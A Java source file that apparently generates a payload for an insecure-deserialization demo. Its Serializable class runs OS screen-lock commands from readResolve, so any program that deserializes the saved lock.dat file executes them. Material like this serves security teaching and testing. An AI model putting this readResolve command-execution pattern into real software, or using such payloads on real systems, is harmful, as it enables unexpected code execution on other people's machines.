import java.io.*;

// Marker interface for allowed classes during deserialization

public class LockComputer implements Serializable {
    private static final long serialVersionUID = 1L;

    public LockComputer() {
        // Constructor without locking logic
    }

    private void lockComputer() {
        String os = System.getProperty("os.name").toLowerCase();

        try {
            ProcessBuilder processBuilder;

            if (os.contains("win")) {
                // Windows
                processBuilder = new ProcessBuilder("cmd", "/c", "rundll32.exe", "user32.dll,LockWorkStation");
            } else if (os.contains("mac")) {
                // macOS
                processBuilder = new ProcessBuilder("open", "-a", "ScreenSaverEngine");
            } else if (os.contains("nix") || os.contains("nux") || os.contains("bsd")) {
                // Linux
                processBuilder = new ProcessBuilder("gnome-screensaver-command", "--lock");
            } else {
                throw new UnsupportedOperationException("Unsupported operating system: " + os);
            }

            // Start the process
            Process process = processBuilder.start();

            // Wait for the process to finish (optional)
            int exitCode = process.waitFor();
            System.out.println("Exit Code: " + exitCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            serializeToFile("SerializedFiles/01_NoCheck/lock.dat", new LockComputer());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void serializeToFile(String filename, Object obj) {
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename))) {
            oos.writeObject(obj);
            System.out.println("Object serialized and saved to " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Object readResolve() throws ObjectStreamException {
        lockComputer();
        return this;
    }
}
